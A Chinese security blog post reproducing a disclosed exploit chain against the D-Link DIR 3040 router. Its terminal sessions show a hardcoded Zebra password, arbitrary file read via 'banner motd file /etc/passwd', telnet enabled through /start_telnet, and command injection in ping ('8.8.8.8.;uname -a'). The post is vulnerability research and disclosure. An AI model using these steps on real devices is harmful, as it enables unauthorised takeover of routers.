**作者：OneShell@知道创宇404实验室  
时间：2021年7月26日**
7月中旬，Cisco Talos安全研究员Dave MacDaniel公布了D-Link DIR
3040（固件版本1.13B03）的多个CVE漏洞的具体利用细节，这些漏洞环环相扣，从硬编码密码导致的信息泄露一步步到无需认证的RCE，具体的漏洞编号和漏洞描述如下：
  * CVE-2021-12817：Zebra服务因读取任意文件设置登录banner导致的敏感信息泄露
  * CVE-2021-12818：Zebra服务使用硬编码密码zebra
  * CVE-2021-12819：可通过访问https:///start_telnet开启telnet，并使用管理员密码登录，其中提供的功能例如ping存在命令注入
从这三个漏洞的描述就可以看出攻击链大概就是：先使用Zebra硬编码密码登录，然后通过读取任意文件窃取管理员admin密码，再开启telnet，最后实现命令注入，将一个本来是后认证的RCE组合变成了无条件RCE。下面就先直接上图说明漏洞利用的可行性，然后再进行原理的分析。
## 攻击链复现
我手头上是有一个部署在公网的路由器DIR 3040，一开始端口是没有开启telnet的，下图是我复现漏洞成功后，没有关闭telnet。
    # oneshell @ UbuntuDev in ~ [23:44:30] C:130
    $ nmap -Pn X.X.X.X
    Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-22 23:44 PDT
    Nmap scan report for XXX.XXX.com (X.X.X.X)
    Host is up (0.28s latency).
    Not shown: 995 filtered ports
    PORT     STATE SERVICE
    23/tcp   open  telnet
    53/tcp   open  domain
    80/tcp   open  http
    443/tcp  open  https
    2602/tcp open  ripd
首先使用telnet登录开启了Zebra的2601端口，使用硬编码密码zebra，实际上也是服务的默认密码，Zebra使用默认密码在06年的时候就爆出来过一些。
    # oneshell @ UbuntuDev in ~ [23:42:09] C:1
    $ telnet X.X.X.X 2601
    Trying X.X.X.X...
    Connected to X.X.X.X.
    Escape character is '^]'.
              ___           ___           ___
             /__/\         /  /\         /  /\
            _\_ \:\       /  /::\       /  /:/_
           /__/\ \:\     /  /:/\:\     /  /:/ /\
          _\_ \:\ \:\   /  /:/~/:/    /  /:/ /::\
         /__/\ \:\ \:\ /__/:/ /:/___ /__/:/ /:/\:\
         \  \:\ \:\/:/ \  \:\/:::::/ \  \:\/:/~/:/
          \  \:\ \::/   \  \::/~~~~   \  \::/ /:/
           \  \:\/:/     \  \:\        \__\/ /:/
            \  \::/       \  \:\         /__/:/
             \__\/         \__\/         \__\/
     -----------------------------------------------------     BARRIER BREAKER (%C, %R)
     -----------------------------------------------------      * 1/2 oz Galliano         Pour all ingredients into
      * 4 oz cold Coffee        an irish coffee mug filled
      * 1 1/2 oz Dark Rum       with crushed ice. Stir.
      * 2 tsp. Creme de Cacao
     -----------------------------------------------------    
    User Access Verification
    Password:
    Router> enable
    Password:
    Router# configure terminal
    Router(config)# banner motd file /etc/passwd
    Router(config)# exit
    Router# exit
    Connection closed by foreign host.
使用telnet再次登录，就会发现，登录提示的banner已经把/etc/passwd文件显示出来了。在/etc/passwd中的密码是以md5的形式保存的，有能力的师傅可以尝试解出来，但是，admin的明文账号密码是被保存在/var/2860_data.dat文件中的，那么设置banner到这个文件就可以成功读取到admin的明文密码，为下一步的认证RCE做准备。
这个时候访问https:///start_telnet开启路由器的测试CLI，这个页面访问的结果返回是404，不用担心，已经成功开启了设备的telnet了。然后可以使用上一步得到的admin账号密码登录，然后也可以看到，在ping那个功能处存在命令注入。
    # oneshell @ LAPTOP-M8H23J7M in ~ [14:54:22] C:1
    $ telnet X.X.X.X
    Trying X.X.X.X...
    Connected to X.X.X.X.
    Escape character is '^]'.
    D-Link login: admin
    Password:
    libcli test environment
    router> help
    Commands available:
      help                 Show available commands
      quit                 Disconnect
      history              Show a list of previously run commands
      protest              protest cmd
      iwpriv               iwpriv cmd
      ifconfig             ifconfig cmd
      iwconfig             iwconfig cmd
      reboot               reboot cmd
      brctl                brctl cmd
      ated                 ated cmd
      ping                 ping cmd
    router> ping -c 1 8.8.8.8.;uname -a
    ping: bad address '8.8.8.8.'
    Linux D-Link 3.10.14+ #1 SMP Fri Aug 14 18:42:10 CST 2020 mips GNU/Linux
## 漏洞分析
漏洞的利用顺序是从CVE-2021-12818到CVE-2021-12817再到CVE-2021-12819，分析顺序也是按照这个来进行。顺便强调一下，这篇文章是偏向于分析，很多线索都是基于已有的漏洞信息来进行推断的，然后菜菜的我尽量去揣测挖洞大佬是怎么找出这个漏洞的，并说出自己猜测的思路，如果有不正确或者师傅们有更好的思路，还望指出来，蟹蟹！